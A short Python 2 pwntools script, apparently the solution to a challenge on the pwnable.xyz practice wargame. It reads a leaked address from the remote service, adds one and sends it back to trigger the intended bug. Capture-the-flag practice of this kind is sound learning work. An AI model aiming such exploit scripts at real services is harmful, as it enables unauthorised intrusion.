from pwn import *

p = remote('svc.pwnable.xyz',30000)
print p.recv()
a = p.recv()
print a
pwnaddr = str(int(a.split()[1], 16)+1)
p.sendline(pwnaddr)
print p.recv()
p.sendline('a')
print p.recv()
